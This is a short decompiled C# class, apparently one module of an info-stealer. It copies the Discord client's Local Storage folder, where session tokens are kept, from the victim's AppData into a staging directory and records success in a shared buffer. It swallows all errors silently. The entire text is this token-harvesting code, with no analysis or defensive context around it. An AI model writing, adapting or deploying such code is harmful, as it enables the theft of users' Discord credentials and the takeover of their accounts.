using System;
using System.IO;

// Token: 0x0200000E RID: 14
internal class DS
{
	// Token: 0x06000021 RID: 33 RVA: 0x00003E0C File Offset: 0x0000200C
	public static void Start()
	{
		try
		{
			string text = string.Format("{0}Discord", global::Buffer.path_l);
			string text2 = string.Format("{0}discord\\Local Storage", global::Buffer.path_ad);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				new DirectoryCopy(text2, string.Format("{0}\\Local Storage", text));
				global::Buffer.XBufferData[4] = "1";
				return;
			}
			File.WriteAllText(string.Format("{0}\\data.txt", text), string.Format("{0}", global::Buffer.head));
		}
		catch
		{
		}
		global::Buffer.XBufferData[4] = "0";
	}
}
